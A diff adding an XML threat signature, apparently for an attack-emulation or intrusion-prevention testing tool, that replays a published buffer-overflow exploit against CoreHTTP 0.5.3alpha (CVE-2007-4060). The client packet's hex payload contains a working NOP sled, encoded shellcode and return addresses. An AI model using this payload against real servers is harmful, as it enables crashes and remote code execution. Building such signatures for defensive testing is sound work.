@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="corehttp 0.5.3alpha (httpd) Remote Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat uses a long specially crafted URI in the http request of a emulated client to crash or execute arbitrary code on server running Corehttp 0.5.3.  CoreHTTP is a web server and typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CoreHTTP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CoreHTTP_CoreHTTP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="CoreHTTP_CoreHTTP_0.5.3_alpha"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4243"/>
+    <CVEID display="true" value="CVE-2007-4060"/>
+    <bugtraqID display="true" value="25120"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="d78fa24eb949b4c303ab82f4a2a0d44d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633227363073437500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1188358686" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="58209090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090EB0359EB05E8F8FFFFFF4F494949494949515A5654583633305658344130423648483042333042435658324244424834413241443041445442445142304144415658345A3842444A4F4D41534B4D4335434443354C5644504C5648464A4549394948414E4D4C423848494344443548364A564F314B52484643454948414E4C3648564A354255415548554948414E4D4C4248424B4846414D434E4D4C423844554445484543344958414E424B48564D4C423843394C3644304955424B4F534D4C424849344937494F424B4B3044554A564F324F5243574A464A364F424456494650464948434E445543454938414E4D4C42585A60ECFFBF60ECFFBF60ECFFBF60ECFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF60EAFFBF0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
